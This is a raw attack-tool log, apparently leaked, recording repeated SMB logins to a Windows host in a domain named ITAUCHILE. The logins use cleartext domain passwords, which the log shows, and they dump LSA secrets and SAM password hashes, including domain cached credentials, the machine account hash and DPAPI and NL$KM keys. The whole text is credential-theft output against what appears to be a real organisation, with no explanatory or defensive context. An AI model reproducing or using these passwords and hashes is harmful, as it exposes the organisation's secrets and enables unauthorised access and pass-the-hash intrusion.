12-22-2020 18:51:41 [*] PREVIRTUAL014.ITAUCHILE.CL:445 is running Windows 6.1 Build 7601 (name:PREVIRTUAL014) (domain:ITAUCHILE)
12-22-2020 18:51:41 [+] PREVIRTUAL014.ITAUCHILE.CL:445 Login successful ITAUCHILE\CJGO0366:ItaSeg2020
12-22-2020 18:51:46 [+] PREVIRTUAL014.ITAUCHILE.CL:445 Dumping LSA secrets:
12-22-2020 18:51:51 CRPA3870:f1499254e7621ce2e131de4af9be21f9:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 18:51:52 EEAA4651:b1f7b5c46b3052a583a6c2bb00c3e58f:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 18:51:53 CRPA0570:b1bbcbdda067e481cb4710825e74506c:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 18:51:55 ITAUCHILE\PREVIRTUAL014$:aad3b435b51404eeaad3b435b51404ee:2feb3cecb31a77558904113b10b80ae3:::
12-22-2020 18:51:58 DPAPI_SYSTEM:010000001bfc568f0943277d203e0f5b78ad49f094670839363b8544f2f51aafafa19ee7e556874046ea1568
12-22-2020 18:51:59 NL$KM:a22eca6e48e565535b8328cccd2c15895f26ca6cca6cf7f2e53a3724eecbf88942c6be9aab7ffabbc37112bf7ce38396585943897d03792b12317fead758918c
12-22-2020 18:57:28 [*] PREVIRTUAL014.ITAUCHILE.CL:445 is running Windows 6.1 Build 7601 (name:PREVIRTUAL014) (domain:ITAUCHILE)
12-22-2020 18:57:29 [+] PREVIRTUAL014.ITAUCHILE.CL:445 Login successful ITAUCHILE\CJGO0366:ItaSeg2020
12-22-2020 18:57:35 [+] PREVIRTUAL014.ITAUCHILE.CL:445 Dumping SAM hashes (uid:rid:lmhash:nthash):
12-22-2020 18:57:39 Administrador:500:aad3b435b51404eeaad3b435b51404ee:19c847a73766c1cf99cb687a70853b15:::
12-22-2020 18:57:41 Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
12-22-2020 18:57:43 lcladmin:1003:aad3b435b51404eeaad3b435b51404ee:abb9e6e60d5125cf9d41ecc1a6aba808:::
12-22-2020 18:57:45 robotics:1004:aad3b435b51404eeaad3b435b51404ee:15859fbc2bcadd22d69061390609c448:::
12-22-2020 19:00:26 [*] PREVIRTUAL014.ITAUCHILE.CL:445 is running Windows 6.1 Build 7601 (name:PREVIRTUAL014) (domain:ITAUCHILE)
12-22-2020 19:00:26 [+] PREVIRTUAL014.ITAUCHILE.CL:445 Login successful ITAUCHILE\CJGO0366:ItaSeg2020
12-22-2020 19:00:31 [+] PREVIRTUAL014.ITAUCHILE.CL:445 Dumping LSA secrets:
12-22-2020 19:00:36 CRPA3870:f1499254e7621ce2e131de4af9be21f9:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 19:00:37 EEAA4651:b1f7b5c46b3052a583a6c2bb00c3e58f:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 19:00:38 CRPA0570:b1bbcbdda067e481cb4710825e74506c:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 19:00:40 ITAUCHILE\PREVIRTUAL014$:aad3b435b51404eeaad3b435b51404ee:2feb3cecb31a77558904113b10b80ae3:::
12-22-2020 19:00:43 DPAPI_SYSTEM:010000001bfc568f0943277d203e0f5b78ad49f094670839363b8544f2f51aafafa19ee7e556874046ea1568
12-22-2020 19:00:44 NL$KM:a22eca6e48e565535b8328cccd2c15895f26ca6cca6cf7f2e53a3724eecbf88942c6be9aab7ffabbc37112bf7ce38396585943897d03792b12317fead758918c
12-22-2020 21:08:03 [*] PREVIRTUAL014.ITAUCHILE.CL:445 is running Windows 6.1 Build 7601 (name:PREVIRTUAL014) (domain:ITAUCHILE)
12-22-2020 21:08:04 [+] PREVIRTUAL014.ITAUCHILE.CL:445 Login successful ITAUCHILE\USR_ROBOTIC:Usr.ROBOT19*
12-22-2020 21:08:09 [+] PREVIRTUAL014.ITAUCHILE.CL:445 Dumping LSA secrets:
12-22-2020 21:08:13 CRPA3870:f1499254e7621ce2e131de4af9be21f9:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 21:08:14 EEAA4651:b1f7b5c46b3052a583a6c2bb00c3e58f:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 21:08:15 CRPA0570:b1bbcbdda067e481cb4710825e74506c:ITAUCHILE.CL:ITAUCHILE:::
12-22-2020 21:08:18 ITAUCHILE\PREVIRTUAL014$:aad3b435b51404eeaad3b435b51404ee:2feb3cecb31a77558904113b10b80ae3:::
12-22-2020 21:08:20 DPAPI_SYSTEM:010000001bfc568f0943277d203e0f5b78ad49f094670839363b8544f2f51aafafa19ee7e556874046ea1568
12-22-2020 21:08:22 NL$KM:a22eca6e48e565535b8328cccd2c15895f26ca6cca6cf7f2e53a3724eecbf88942c6be9aab7ffabbc37112bf7ce38396585943897d03792b12317fead758918c
